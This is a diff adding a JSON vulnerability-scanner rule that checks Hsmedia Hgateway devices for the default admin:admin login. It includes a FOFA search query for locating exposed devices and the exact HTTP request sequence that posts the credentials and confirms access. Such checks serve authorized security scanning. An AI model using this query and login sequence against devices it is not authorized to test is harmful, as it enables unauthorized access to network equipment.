@@ -1,0 +1,134 @@
+{
+  "Name": "Hsmedia Hgateway default account",
+  "Description": "Hsmedia Hgateway default account, which may cause the server to be compromised.",
+  "Product": "Hsmedia-Hgateway",
+  "Homepage": "http://hassmedia.com/",
+  "DisclosureDate": "2020-01-13",
+  "Author": "itardc@163.com",
+  "FofaQuery": "title=\"系统登录\" && body=\"login.php\" && body=\"img/bg.gif\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "302",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Location",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": [
+        "path|lastheader|regex|Location: /(.*?)/index.php"
+      ]
+    },
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/{{{path}}}/index.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Set-Cookie: PHPSESSID",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },
+    {
+      "Request": {
+        "data": "Name=admin&Pass=admin",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": "{{{fixedhostinfo}}}",
+          "Referer": "{{{fixedhostinfo}}}/{{{path}}}/index.php"
+        },
+        "method": "POST",
+        "uri": "/{{{path}}}/login.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "302",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Location: home.php",
+            "variable": "$head"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": [
+        "keymemo|lastbody|variable|admin:admin",
+        "vulurl|lastbody|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/manager/login.php"
+      ]
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["defaultaccount"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Hsmedia-Hgateway"]
+  }
+}
